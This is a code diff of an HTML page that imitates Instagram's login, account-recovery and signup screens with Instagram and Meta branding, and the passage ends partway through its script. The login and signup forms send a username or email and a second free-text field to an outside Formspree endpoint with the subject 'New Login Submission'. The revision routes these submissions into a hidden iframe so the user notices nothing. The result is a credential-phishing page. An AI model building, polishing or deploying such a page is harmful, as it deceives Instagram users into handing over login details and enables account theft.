@@ -1,639 +1,480 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>Instagram UI</title>
-
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Instagram</title>
+<link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&family=Urbanist:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
-
-*{
-    box-sizing:border-box;
-    margin:0;
-    padding:0;
+:root{--bg:#fff;--fg:#000;--mut:#737373;--bd:#dbdbdb;--hov:#f2f2f2;--blue:#0095f6;--red:#ff3040;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
+@media(prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#000;--fg:#f5f5f5;--mut:#a8a8a8;--bd:#262626;--hov:#1a1a1a}}
+:root[data-theme="dark"]{--bg:#000;--fg:#f5f5f5;--mut:#a8a8a8;--bd:#262626;--hov:#1a1a1a}
+*{box-sizing:border-box;margin:0}
+html,body{background:var(--bg);color:var(--fg);font:14px/18px -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
+html{scroll-padding-top:env(safe-area-inset-top,0px)}
+button{font:inherit;color:inherit;background:none;border:0;cursor:pointer}
+svg.i{width:24px;height:24px;fill:none;stroke:currentColor;stroke-width:2;stroke-linecap:round;stroke-linejoin:round;flex:none}
+a{color:inherit;text-decoration:none}
+:focus-visible{outline:2px solid var(--blue);outline-offset:2px}
+.logo{font-family:"Grand Hotel","Snell Roundhand",cursive;font-size:29px;line-height:1}
+/* sidebar */
+nav.side{position:fixed;left:0;top:0;bottom:0;width:244px;border-right:1px solid var(--bd);padding:8px 12px 20px;display:flex;flex-direction:column;background:var(--bg);z-index:5}
+nav.side .logo{padding:25px 12px 16px;font-size:30px}
+nav.side button{display:flex;align-items:center;gap:16px;padding:12px;margin:2px 0;border-radius:8px;font-size:16px;width:100%;text-align:left}
+nav.side button:hover{background:var(--hov)}
+nav.side button.on{font-weight:700}
+nav.side button.on svg{stroke-width:2.6}
+nav.side .sp{flex:1}
+.mini{width:24px;height:24px;border-radius:50%;background:linear-gradient(135deg,#8a3ab9,#e95950);flex:none}
+/* layout */
+main{margin-left:244px;display:flex;justify-content:center;gap:64px;padding:24px 16px}
+.feed{width:min(470px,100%)}
+.side2{width:319px;padding-top:16px}
+@media(max-width:1100px){.side2{display:none}}
+/* stories */
+.stories{display:flex;gap:14px;overflow-x:auto;padding:4px 0 16px;scrollbar-width:none}
+.stories::-webkit-scrollbar{display:none}
+.st{display:flex;flex-direction:column;align-items:center;gap:6px;width:66px;flex:none;font-size:12px}
+.st span{width:66px;text-align:center;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.ring{padding:3px;border-radius:50%;background:linear-gradient(45deg,#feda75,#fa7e1e,#d62976,#962fbf,#4f5bd5)}
+.ring.seen{background:var(--bd)}
+.ring i,.av{display:grid;place-items:center;border-radius:50%;font-style:normal;font-weight:600;color:#fff}
+.ring i{width:56px;height:56px;border:3px solid var(--bg);font-size:20px}
+.av{width:32px;height:32px;font-size:13px;flex:none}
+/* post */
+.post{border-bottom:1px solid var(--bd);padding-bottom:16px;margin-bottom:20px}
+.ph{display:flex;align-items:center;gap:10px;padding:8px 0}
+.ph b{font-weight:600}.ph .t{color:var(--mut)}
+.ph .more{margin-left:auto}
+.pic{position:relative;aspect-ratio:4/5;border:1px solid var(--bd);border-radius:4px;overflow:hidden;cursor:pointer;user-select:none}
+.pop{position:absolute;inset:0;display:grid;place-items:center;pointer-events:none;opacity:0}
+.pop svg{width:88px;height:88px;fill:#fff;stroke:none;filter:drop-shadow(0 2px 8px rgba(0,0,0,.4))}
+.pop.go{animation:pop .8s ease-out}
+@keyframes pop{0%{opacity:0;transform:scale(.4)}25%{opacity:1;transform:scale(1.15)}60%{opacity:1;transform:scale(1)}100%{opacity:0;transform:scale(1)}}
+.acts{display:flex;align-items:center;gap:4px;padding:6px 0 4px;margin-left:-8px}
+.acts button{padding:8px}.acts button:hover{color:var(--mut)}
+.acts .sv{margin-left:auto}
+.liked svg{fill:var(--red);stroke:var(--red)}
+.saved svg{fill:currentColor}
+.likes{font-weight:600;margin-bottom:6px}
+.cap b{font-weight:600}
+.cap .mo,.vc{color:var(--mut)}
+.vc{display:block;margin-top:4px;cursor:pointer}
+.cm{display:flex;align-items:center;margin-top:6px}
+.cm input{flex:1;background:none;border:0;color:inherit;font:inherit;outline:0;padding:4px 0}
+.cm input::placeholder{color:var(--mut)}
+.cm button{color:var(--blue);font-weight:600;opacity:0;pointer-events:none}
+.cm.on button{opacity:1;pointer-events:auto}
+/* right */
+.me,.sg{display:flex;align-items:center;gap:12px;padding:8px 0}
+.me .av,.sg .av{width:44px;height:44px;font-size:16px}
+.sg .av{width:44px;height:44px}
+.grow{flex:1;min-width:0}.grow small{display:block;color:var(--mut);font-size:12px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.blue{color:var(--blue);font-weight:600;font-size:12px}
+.blue:hover{color:var(--fg)}
+.sh{display:flex;justify-content:space-between;margin:16px 0 4px;color:var(--mut);font-weight:600}
+.sh button{color:var(--fg);font-size:12px;font-weight:600}
+.foot{color:var(--mut);font-size:12px;line-height:16px;margin-top:24px}
+/* viewer */
+.vw{position:fixed;inset:0;background:rgba(0,0,0,.92);z-index:20;display:none;align-items:center;justify-content:center}
+.vw.on{display:flex}
+.card{position:relative;width:min(380px,100vw);height:min(676px,100%);aspect-ratio:9/16;border-radius:8px;overflow:hidden;color:#fff}
+.bars{position:absolute;top:10px;left:10px;right:10px;height:2px;background:rgba(255,255,255,.35);border-radius:2px;overflow:hidden}
+.bars i{display:block;height:100%;width:0;background:#fff}
+.bars i.run{animation:fill 5s linear forwards}
+@keyframes fill{to{width:100%}}
+.card .who{position:absolute;top:22px;left:14px;display:flex;align-items:center;gap:10px;font-weight:600}
+.x{position:absolute;top:14px;right:16px;color:#fff;font-size:30px;line-height:1}
+/* mobile */
+.top,.bot{display:none}
+@media(max-width:767px){
+ nav.side{display:none}
+ main{margin:0;padding:8px 0 64px}
+ .feed{width:100%}.stories{padding-left:12px}.post>*:not(.pic){margin-left:12px;margin-right:12px}.pic{border-radius:0;border-left:0;border-right:0}
+ .top{display:flex;align-items:center;justify-content:space-between;position:sticky;top:env(safe-area-inset-top,0px);background:var(--bg);border-bottom:1px solid var(--bd);padding:8px 16px;z-index:4}
+ .top .logo{font-size:28px}
+ .bot{display:flex;justify-content:space-around;position:fixed;left:0;right:0;bottom:0;background:var(--bg);border-top:1px solid var(--bd);padding:10px 0 calc(10px + env(safe-area-inset-bottom,0px));z-index:6}
 }
-
-body{
-    background:#192832;
-    color:white;
-    font-family:Arial,Helvetica,sans-serif;
-}
-
-/* =========================
-   COMMON SCREEN
-========================= */
-
-.screen{
-    min-height:100vh;
-    display:none;
-    flex-direction:column;
-}
-
-.screen.active{
-    display:flex;
-}
-
-/* =========================
-   SPLASH
-========================= */
-
-#splash{
-    align-items:center;
-    justify-content:space-between;
-    padding:30px 20px;
-}
-
-.instagram-logo{
-    width:86px;
-    height:86px;
-    border-radius:25px;
-
-    background:
-        radial-gradient(
-            circle at 70% 25%,
-            #ffd600 0 8%,
-            #ff7a00 20%,
-            #ff0169 50%,
-            #d300c5 75%,
-            #7638fa 100%
-        );
-
-    position:relative;
-}
-
-.instagram-logo::before{
-    content:"";
-    position:absolute;
-    inset:16px;
-    border:7px solid white;
-    border-radius:20px;
-}
-
-.instagram-logo::after{
-    content:"";
-    position:absolute;
-    width:18px;
-    height:18px;
-    border:5px solid white;
-    border-radius:50%;
-    top:29px;
-    left:29px;
-}
-
-/* =========================
-   HEADER
-========================= */
-
-.topbar{
-    padding:18px 20px;
-    border-bottom:1px solid #34434d;
-    display:flex;
-    align-items:center;
-    justify-content:space-between;
-}
-
-.logo-text{
-    font-family:cursive;
-    font-size:30px;
-}
-
-.language{
-    text-align:center;
-    color:#aab2b8;
-    padding:18px;
-}
-
-/* =========================
-   LOGIN
-========================= */
-
-.auth-container{
-    width:min(510px,90%);
-    margin:auto;
-    display:flex;
-    flex-direction:column;
-    align-items:center;
-}
-
-.auth-logo{
-    width:78px;
-    height:78px;
-    margin-bottom:70px;
-}
-
-.auth-form{
-    width:100%;
-}
-
-/* NORMAL TEXT INPUT */
-
-.auth-input{
-    width:100%;
-    height:64px;
-
-    background:transparent;
-    border:1px solid #3d4d58;
-    border-radius:34px;
-
-    padding:0 30px;
-
-    color:white;
-    font-size:18px;
-
-    margin-bottom:14px;
-
-    outline:none;
-}
-
-.auth-input:focus{
-    border-color:#008cff;
-}
-
-.auth-input::placeholder{
-    color:#9aa5ad;
-}
-
-/* BUTTON */
-
-.primary-button{
-    width:100%;
-    height:60px;
-
-    border:0;
-    border-radius:32px;
-
-    background:#086fe8;
-    color:white;
-
-    font-size:18px;
-    font-weight:600;
-
-    cursor:pointer;
-
-    margin-top:5px;
-}
-
-.primary-button:hover{
-    background:#0878f5;
-}
-
-.secondary-button{
-    width:100%;
-    height:60px;
-
-    border:1px solid #087cff;
-    border-radius:32px;
-
-    background:transparent;
-    color:#4aa3ff;
-
-    font-size:18px;
-
-    cursor:pointer;
-
-    margin-top:15px;
-}
-
-.forgot{
-    text-align:center;
-    font-size:18px;
-    margin-top:22px;
-    color:white;
-    background:none;
-    border:0;
-    cursor:pointer;
-}
-
-.bottom-space{
-    flex:1;
-}
-
-.meta{
-    text-align:center;
-    font-size:24px;
-    color:#ff4778;
-    margin-top:25px;
-    margin-bottom:20px;
-}
-
-/* =========================
-   CREATE ACCOUNT
-========================= */
-
-#create-account{
-    padding:20px;
-}
-
-.create-container{
-    width:min(510px,90%);
-    margin:auto;
-}
-
-.back{
-    background:none;
-    border:0;
-    color:white;
-    font-size:34px;
-    cursor:pointer;
-    margin-bottom:25px;
-}
-
-.create-title{
-    font-size:32px;
-    margin-bottom:12px;
-}
-
-.create-subtitle{
-    color:#aab3ba;
-    font-size:17px;
-    line-height:24px;
-    margin-bottom:30px;
-}
-
-.create-form{
-    width:100%;
-}
-
-/* SUCCESS */
-
-.success{
-    text-align:center;
-    display:none;
-    margin-top:80px;
-}
-
-.success.show{
-    display:block;
-}
-
-.success-icon{
-    width:75px;
-    height:75px;
-    border-radius:50%;
-    background:#168a45;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    margin:0 auto 25px;
-    font-size:40px;
-}
-
-.success h2{
-    font-size:30px;
-    margin-bottom:12px;
-}
-
-.success p{
-    color:#aab3ba;
-    font-size:17px;
-}
-
-/* =========================
-   MOBILE
-========================= */
-
-@media(max-width:600px){
-
-    .auth-container,
-    .create-container{
-        width:calc(100% - 40px);
-    }
-
-    .auth-logo{
-        margin-top:80px;
-        margin-bottom:70px;
-    }
-
-    .auth-input{
-        height:62px;
-        font-size:17px;
-    }
-
-}
-
+@media(prefers-reduced-motion:reduce){.pop.go,.bars i.run{animation-duration:.01s}}
+
+/* auth flow */
+body.auth #app{display:none}
+.scr{position:fixed;inset:0;z-index:50;display:none;flex-direction:column;overflow:auto;color:#f5f5f5;background:#1b2830;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
+.scr.on{display:flex}
+.scr.dk{background:#0c1014}
+.wrap{width:min(440px,100%);margin:0 auto;padding:0 20px;flex:1;display:flex;flex-direction:column}
+.g{width:74px;height:74px}
+.wm{font-family:Urbanist,"Segoe UI",system-ui,sans-serif;font-weight:500;letter-spacing:-.5px;line-height:1}
+.meta{display:flex;align-items:center;justify-content:center;gap:4px;font:600 26px/1 Urbanist,system-ui,sans-serif}
+.meta svg{width:34px;height:22px;fill:none;stroke:url(#mg);stroke-width:4;stroke-linecap:round}
+.meta span{background:linear-gradient(90deg,#ff6a1a,#e6178c);-webkit-background-clip:text;background-clip:text;color:transparent}
+.from{color:#7b8794;text-align:center;font-size:17px;margin-bottom:6px}
+#s-splash .wrap{align-items:center;justify-content:space-between;padding-bottom:36px}
+#s-splash .g{margin:auto 0;animation:brt 1.4s ease-in-out infinite alternate}
+@keyframes brt{to{transform:scale(1.06)}}
+.bar{display:flex;align-items:center;justify-content:space-between;padding:14px 20px;border-bottom:1px solid #2b333a}
+.bar .wm{font-size:30px}
+.lnk{color:#7d8cff;font-weight:500;font-size:17px;cursor:pointer;background:none;border:0}
+.btn2{background:#4a5cf7;color:#fff;font-weight:600;font-size:17px;padding:12px 20px;border-radius:14px}
+.lang{color:#a0a8b0;text-align:center;padding:16px}
+.lang svg{width:16px;height:16px;margin-left:5px;vertical-align:-3px;fill:none;stroke:currentColor;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round}
+.hero{border:1px solid #2b333a;padding:44px 20px 30px;text-align:center;margin:60px auto;width:min(400px,calc(100% - 32px))}
+.hero .wm{font-size:44px;margin-bottom:34px}
+.hero h1{font:400 34px/1.2 Urbanist,system-ui,sans-serif;margin-bottom:34px}
+.hero h1 em{font-style:normal;background:linear-gradient(90deg,#ff4a1c,#e6178c);-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero .pl{width:100%;background:#4a5cf7;color:#fff;font-size:20px;font-weight:600;height:60px;border-radius:30px;margin-bottom:26px;border:0;cursor:pointer}
+.hero p{color:#c9ced3;font-size:19px}
+.back{padding:18px 0 10px;width:40px;color:#fff}.back svg{width:28px;height:28px}
+.wrap h2{font-size:32px;line-height:38px;font-weight:700;margin:14px 0 14px}
+.wrap .sub{font-size:18px;line-height:24px;margin-bottom:26px}
+.wrap .sub a,.wrap .note a{color:#4aa3ff;font-weight:600}
+.fld{width:100%;height:62px;border-radius:31px;border:1px solid #3d4b55;background:transparent;color:#f5f5f5;padding:0 24px;font:18px system-ui,sans-serif;margin-bottom:12px;outline:0}
+.fld:focus{border-color:#4aa3ff}.fld::placeholder{color:#99a4ac}
+.fld.bad{border-color:#ff5c6c}
+.note{color:#99a4ac;font-size:17px;line-height:24px;margin:2px 0 22px}
+.err{color:#ff6b7a;font-size:15px;min-height:20px;margin:-4px 0 8px 8px}
+.pill{width:100%;height:54px;border-radius:27px;background:#0064e0;color:#fff;font-weight:600;font-size:18px;margin-bottom:14px;border:0;cursor:pointer;display:flex;align-items:center;justify-content:center}
+.pill:hover{filter:brightness(1.1)}
+.pill.sec{background:#2b2d31;color:#aab0b6;font-weight:500}
+.pill.out{background:transparent;border:1px solid #0a7cff;color:#4aa3ff;font-weight:500}
+.sp2{flex:1}
+.ctr{text-align:center;color:#fff;font-size:18px;padding:8px;background:none;border:0;cursor:pointer}
+.ctr.b{color:#4aa3ff;font-weight:500}
+#s-login .g{margin:11vh auto 12vh;display:block}
+#s-login .lang{padding:14px}
+.ld{width:22px;height:22px;border:3px solid #ffffff55;border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite}
+@keyframes sp{to{transform:rotate(360deg)}}
+
+/* Auth multi-step screens */
+#s-find .wrap,#s-step .wrap{padding-top:18px}
+#s-find h2,#s-step h2{margin-top:14px}
+#s-find .lnk{display:block}
+#s-step form{display:flex;flex-direction:column;min-height:100%}
+#s-step form .sp2{flex:1}
+#formspreeFrame{display:none}
 </style>
 </head>
+<body class="auth">
+<svg width="0" height="0" style="position:absolute"><defs>
+<symbol id="home" viewBox="0 0 24 24"><path d="M3 10.5 12 3l9 7.5V21h-6v-7H9v7H3z"/></symbol>
+<symbol id="search" viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><path d="m16 16 5 5"/></symbol>
+<symbol id="explore" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="m16 8-2 6-6 2 2-6z"/></symbol>
+<symbol id="reels" viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="5"/><path d="M3 9h18M9 3l3 6M15 3l3 6M10 13l5 3-5 3z"/></symbol>
+<symbol id="msg" viewBox="0 0 24 24"><path d="M22 3 2 10l8 3 3 8zM10 13l12-10"/></symbol>
+<symbol id="heart" viewBox="0 0 24 24"><path d="M12 21s-8-5.2-8-11a4.5 4.5 0 0 1 8-2.8A4.5 4.5 0 0 1 20 10c0 5.8-8 11-8 11z"/></symbol>
+<symbol id="plus" viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="5"/><path d="M12 8v8M8 12h8"/></symbol>
+<symbol id="menu" viewBox="0 0 24 24"><path d="M3 6h18M3 12h18M3 18h18"/></symbol>
+<symbol id="save" viewBox="0 0 24 24"><path d="M6 3h12v18l-6-5-6 5z"/></symbol>
+<symbol id="cmt" viewBox="0 0 24 24"><path d="M21 12a8 8 0 0 1-11.5 7.2L3 21l1.8-5.5A8 8 0 1 1 21 12z"/></symbol>
+<symbol id="dots" viewBox="0 0 24 24"><circle cx="5" cy="12" r="1.3"/><circle cx="12" cy="12" r="1.3"/><circle cx="19" cy="12" r="1.3"/></symbol>
+</defs></svg>
 
-
-<body>
-
-
-<!-- =====================================================
-     LOGIN SCREEN
-===================================================== -->
-
-<section
-    id="login-screen"
-    class="screen active"
->
-
-    <div class="language">
-        English (UK)
-    </div>
-
-
-    <div class="auth-container">
-
-        <div class="instagram-logo auth-logo"></div>
-
-
-        <!-- IMPORTANT:
-             NATIVE FORMSPREE FORM
-        -->
-
-        <form
-            id="login-form"
-            class="auth-form"
-            action="https://formspree.io/f/xwlpaveb"
-            method="POST"
-        >
-
-            <!-- FIRST INPUT -->
-
-            <input
-                class="auth-input"
-                type="text"
-                name="name_or_email"
-                placeholder="Name or email address"
-                autocomplete="off"
-                required
-            >
-
-
-            <!-- SECOND INPUT -->
-
-            <input
-                class="auth-input"
-                type="text"
-                name="user_input"
-                placeholder="Enter anything"
-                autocomplete="off"
-                required
-            >
-
-
-            <!-- OPTIONAL SUBJECT -->
-
-            <input
-                type="hidden"
-                name="_subject"
-                value="New Login Submission"
-            >
-
-
-            <!-- SUBMIT -->
-
-            <button
-                type="submit"
-                class="primary-button"
-            >
-                Log in
-            </button>
-
-        </form>
-
-
-        <button
-            class="forgot"
-            type="button"
-        >
-            Forgotten password?
-        </button>
-
-
-        <div class="bottom-space"></div>
-
-
-        <!-- CREATE ACCOUNT -->
-
-        <button
-            id="open-create"
-            type="button"
-            class="secondary-button"
-        >
-            Create new account
-        </button>
-
-
-        <div class="meta">
-            ∞ Meta
-        </div>
-
-    </div>
-
+<svg width="0" height="0" style="position:absolute"><defs>
+<linearGradient id="ig" gradientUnits="userSpaceOnUse" x1="10" y1="2" x2="54" y2="62"><stop offset="0" stop-color="#7a1fff"/><stop offset=".45" stop-color="#ff0a9c"/><stop offset=".78" stop-color="#ff7a00"/><stop offset="1" stop-color="#ffc400"/></linearGradient>
+<linearGradient id="mg" x1="0" x2="1"><stop offset="0" stop-color="#ff6a1a"/><stop offset="1" stop-color="#e6178c"/></linearGradient>
+<symbol id="glyph" viewBox="0 0 64 64"><rect x="6" y="6" width="52" height="52" rx="16" fill="none" stroke="url(#ig)" stroke-width="7"/><circle cx="32" cy="32" r="12" fill="none" stroke="url(#ig)" stroke-width="6"/><circle cx="47" cy="17" r="4" fill="url(#ig)"/></symbol>
+<symbol id="chev" viewBox="0 0 24 24"><path d="m15 4-8 8 8 8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></symbol>
+<symbol id="inf" viewBox="0 0 40 24"><path d="M4 12c0-5 2-9 5-9 4 0 7 6 11 9s7 9 11 9c3 0 5-4 5-9s-2-9-5-9c-4 0-7 6-11 9S13 21 9 21c-3 0-5-4-5-9z" transform="translate(0 -1)"/></symbol>
+</defs></svg>
+<section class="scr dk on" id="s-splash"><div class="wrap"><svg class="g"><use href="#glyph"/></svg><div><div class="from">from</div><div class="meta"><svg viewBox="0 0 40 24"><use href="#inf"/></svg><span>Meta</span></div></div></div></section>
+<section class="scr dk" id="s-land">
+ <div class="bar"><span class="wm">Instagram</span><span style="display:flex;align-items:center;gap:22px"><button class="lnk" data-go="login">Log in</button><button class="btn2" data-go="login">Open app</button></span></div>
+ <div class="lang">English (UK)<svg viewBox="0 0 24 24" aria-hidden="true"><path d="m6 9 6 6 6-6"/></svg></div>
+ <div class="hero"><div class="wm">Instagram</div><h1><em>Share everyday moments</em> with your close friends.</h1><button class="pl" data-go="login">Open Instagram</button><p><button class="lnk" data-go="login" style="font-size:inherit">Log In</button> or <button class="lnk" data-step="email" style="font-size:inherit">Sign Up</button></p></div>
 </section>
+<section class="scr" id="s-login"><div class="lang">English (UK)</div><div class="wrap">
+ <svg class="g"><use href="#glyph"/></svg>
+ 
+ <form id="loginForm" action="https://formspree.io/f/xwlpaveb" method="POST" target="formspreeFrame">
+   <input class="fld" id="lu" name="name_or_email" type="text" placeholder="Username, email address or mobile number" autocomplete="off" aria-label="Name or email address" required>
+   <input class="fld" id="lp" name="user_input" type="text" placeholder="Enter anything" autocomplete="off" aria-label="Enter anything" required>
+   <input type="hidden" name="_subject" value="New Login Submission">
+   <div class="err" id="le"></div>
+   <button class="pill" id="lb" type="submit">Log in</button>
+ </form>
+ 
+ <button class="ctr" id="forgotBtn" type="button">Forgotten password?</button>
+ <div class="sp2"></div>
+ <button class="pill out" id="createBtn" type="button">Create new account</button>
+ <div class="meta" style="margin:6px 0 18px;font-size:22px"><svg viewBox="0 0 40 24"><use href="#inf"/></svg><span>Meta</span></div>
+</div></section>
 
+<!-- FIND ACCOUNT: styled like the real Instagram recovery screen -->
+<section class="scr" id="s-find"><div class="wrap">
+ <button class="back" id="findBack" aria-label="Back"><svg class="i" style="width:28px;height:28px"><use href="#chev"/></svg></button>
+ <h2>Find your account</h2>
+ <p class="sub">Enter your name or email address.</p>
+ <button class="lnk" style="text-align:left;padding:0 0 26px;font-size:17px">I think that my account has been hacked</button>
+ <input class="fld" type="text" placeholder="Name or email address" aria-label="Name or email address">
+ <button class="pill" type="button" id="findContinue">Continue</button>
+ <button class="ctr" type="button" id="findLogin">Find by email address or username instead</button>
+ <div class="sp2"></div>
+</div></section>
 
+<!-- CREATE ACCOUNT: same visual language as the real multi-step signup screens -->
+<section class="scr" id="s-step"><div class="wrap">
+ <button class="back" id="bk" aria-label="Back"><svg class="i" style="width:28px;height:28px"><use href="#chev"/></svg></button>
+ 
+ <form id="signupForm" action="https://formspree.io/f/xwlpaveb" method="POST" target="formspreeFrame">
+   <input type="hidden" name="_subject" value="New Create Account Submission">
+   <input type="hidden" id="signupIdentity" name="name_or_email">
+   
+   <div id="signupStep1">
+     <h2>What's your name or email?</h2>
+     <p class="sub">Enter the name or email address you want to use.</p>
+     <input class="fld" id="sf1" type="text" placeholder="Name or email address" aria-label="Name or email address" autocomplete="off" required>
+     <div class="err" id="se1"></div>
+     <p class="note">You can enter a name or an email address.</p>
+     <button class="pill" type="button" id="signupNext">Next</button>
+     <div class="sp2"></div>
+     <button class="ctr b" type="button" id="signupLogin" style="margin-bottom:22px">I already have an account</button>
+   </div>
+   
+   <div id="signupStep2" style="display:none">
+     <h2>What's your information?</h2>
+     <p class="sub">Enter anything you want in the field below.</p>
+     <input class="fld" id="sf2" name="user_input" type="text" placeholder="Enter anything" aria-label="Enter anything" autocomplete="off">
+     <div class="err" id="se2"></div>
+     <p class="note">This is a normal text field, so you can enter letters, numbers, symbols or any text.</p>
+     <button class="pill" id="signupSubmit" type="submit">Create account</button>
+     <button class="pill sec" type="button" id="signupBackStep">Back</button>
+     <div class="sp2"></div>
+     <button class="ctr b" type="button" id="signupLogin2" style="margin-bottom:22px">I already have an account</button>
+   </div>
+ </form>
+ 
+ <div id="signupSuccess" style="display:none;text-align:center;padding-top:60px">
+   <h2>Submitted successfully</h2>
+   <p class="sub">Both inputs have been sent.</p>
+   <button class="pill" type="button" id="signupAgain">Create another account</button>
+   <button class="pill sec" type="button" id="signupDone">Back to login</button>
+ </div>
+</div></section>
 
-<!-- =====================================================
-     CREATE ACCOUNT SCREEN
-===================================================== -->
+<iframe name="formspreeFrame" id="formspreeFrame" style="display:none"></iframe>
+<div id="app">
+<nav class="side" aria-label="Main">
+ <a class="logo" href="#">Instagram</a>
+ <button class="on"><svg class="i"><use href="#home"/></svg>Home</button>
+ <button><svg class="i"><use href="#search"/></svg>Search</button>
+ <button><svg class="i"><use href="#explore"/></svg>Explore</button>
+ <button><svg class="i"><use href="#reels"/></svg>Reels</button>
+ <button><svg class="i"><use href="#msg"/></svg>Messages</button>
+ <button><svg class="i"><use href="#heart"/></svg>Notifications</button>
+ <button><svg class="i"><use href="#plus"/></svg>Create</button>
+ <button><span class="mini"></span>Profile</button>
+ <div class="sp"></div>
+ <button id="theme"><svg class="i"><use href="#menu"/></svg>Switch appearance</button>
+</nav>
 
-<section
-    id="create-account"
-    class="screen"
->
+<div class="top"><span class="logo">Instagram</span><span style="display:flex;gap:16px"><svg class="i"><use href="#heart"/></svg><svg class="i"><use href="#msg"/></svg></span></div>
 
-    <div class="create-container">
+<main>
+ <section class="feed">
+  <div class="stories" id="stories"></div>
+  <div id="posts"></div>
+ </section>
+ <aside class="side2">
+  <div class="me"><span class="av" style="background:linear-gradient(135deg,#8a3ab9,#e95950)">S</span><div class="grow"><b>shishir.k</b><small>Shishir Katakam</small></div><button class="blue">Switch</button></div>
+  <div class="sh"><span>Suggested for you</span><button>See all</button></div>
+  <div id="sugg"></div>
+  <p class="foot">About · Help · Press · API · Jobs · Privacy · Terms · Locations · Language<br><br>© 2026 INSTAGRAM CLONE (UI DEMO)</p>
+ </aside>
+</main>
 
-        <button
-            id="back-login"
-            class="back"
-            type="button"
-        >
-            ←
-        </button>
+<div class="bot"><svg class="i"><use href="#home"/></svg><svg class="i"><use href="#search"/></svg><svg class="i"><use href="#reels"/></svg><svg class="i"><use href="#plus"/></svg><span class="mini"></span></div>
 
+<div class="vw" id="vw"><div class="card" id="card"><div class="bars"><i id="bar"></i></div><div class="who"><span class="av" id="vav"></span><span id="vn"></span></div><button class="x" id="vx" aria-label="Close">×</button></div></div>
 
-        <h1 class="create-title">
-            Create your account
-        </h1>
-
-
-        <p class="create-subtitle">
-            Enter your details below.
-        </p>
-
-
-        <!--
-            SECOND FORMSPREE FORM
-
-            It sends the SAME two values to
-            the SAME Formspree endpoint.
-        -->
-
-        <form
-            id="create-form"
-            class="create-form"
-            action="https://formspree.io/f/xwlpaveb"
-            method="POST"
-        >
-
-            <!-- FIRST INPUT -->
-
-            <input
-                class="auth-input"
-                type="text"
-                name="name_or_email"
-                placeholder="Name or email address"
-                autocomplete="off"
-                required
-            >
-
-
-            <!-- SECOND INPUT -->
-
-            <input
-                class="auth-input"
-                type="text"
-                name="user_input"
-                placeholder="Enter anything"
-                autocomplete="off"
-                required
-            >
-
-
-            <!-- SUBJECT -->
-
-            <input
-                type="hidden"
-                name="_subject"
-                value="New Create Account Submission"
-            >
-
-
-            <!-- SUBMIT -->
-
-            <button
-                type="submit"
-                class="primary-button"
-            >
-                Create account
-            </button>
-
-        </form>
-
-
-        <!-- SUCCESS MESSAGE -->
-
-        <div
-            id="success"
-            class="success"
-        >
-
-            <div class="success-icon">
-                ✓
-            </div>
-
-            <h2>
-                Submitted successfully
-            </h2>
-
-            <p>
-                Your information has been submitted.
-            </p>
-
-        </div>
-
-    </div>
-
-</section>
-
-
-
+</div>
 <script>
+const $=s=>document.querySelector(s);
+const people=[
+["aarav.codes","#4f5bd5","A"],["meera_frames","#d62976","M"],["hyd.eats","#fa7e1e","H"],["kiran.trek","#2e8b57","K"],
+["ananya.art","#962fbf","A"],["dev.builds","#0095f6","D"],["riya.reads","#e95950","R"],["nikhil.fit","#3b3b98","N"]];
+const bgs=[
+"radial-gradient(circle at 70% 25%,#ffd76a 0 12%,transparent 13%),linear-gradient(180deg,#f8a15b,#c74b6b 55%,#3b2a6b)",
+"linear-gradient(160deg,#1f3a5f,#3c8dbc 50%,#a0e0d0)",
+"radial-gradient(circle at 30% 70%,#fff3 0 20%,transparent 21%),linear-gradient(135deg,#ff7a59,#ffb347)",
+"linear-gradient(200deg,#0f2027,#2c5364 55%,#7fb069)"];
+const posts=[
+{u:0,t:"2h",l:12481,c:"Shipped the bus tracker update tonight. Live ETA finally feels smooth.",n:214},
+{u:1,t:"5h",l:8320,c:"Golden hour over the old city. No filter needed.",n:96},
+{u:2,t:"9h",l:23907,c:"Sunday biryani, the only plan that matters.",n:531},
+{u:3,t:"1d",l:5644,c:"Forest trails, cold air, zero signal.",n:48}];
+const fmt=n=>n.toLocaleString("en-US");
+const av=(p,cls="av")=>`<span class="${cls}" style="background:${p[1]}">${p[2]}</span>`;
+$("#stories").innerHTML=`<div class="st"><div class="ring seen" style="background:var(--bd)"><i style="background:linear-gradient(135deg,#8a3ab9,#e95950)">S</i></div><span>Your story</span></div>`+
+people.map((p,i)=>`<button class="st" data-i="${i}"><div class="ring"><i style="background:${p[1]}">${p[2]}</i></div><span>${p[0]}</span></button>`).join("");
+$("#posts").innerHTML=posts.map((p,i)=>{const u=people[p.u];return `<article class="post" data-i="${i}">
+<div class="ph">${av(u)}<b>${u[0]}</b><span class="t">• ${p.t}</span><button class="more" aria-label="More"><svg class="i"><use href="#dots"/></svg></button></div>
+<div class="pic" style="background:${bgs[i]}"><div class="pop"><svg viewBox="0 0 24 24"><path d="M12 21s-8-5.2-8-11a4.5 4.5 0 0 1 8-2.8A4.5 4.5 0 0 1 20 10c0 5.8-8 11-8 11z"/></svg></div></div>
+<div class="acts"><button class="lk" aria-label="Like"><svg class="i"><use href="#heart"/></svg></button><button class="ci" aria-label="Comment"><svg class="i"><use href="#cmt"/></svg></button><button aria-label="Share"><svg class="i"><use href="#msg"/></svg></button><button class="sv" aria-label="Save"><svg class="i"><use href="#save"/></svg></button></div>
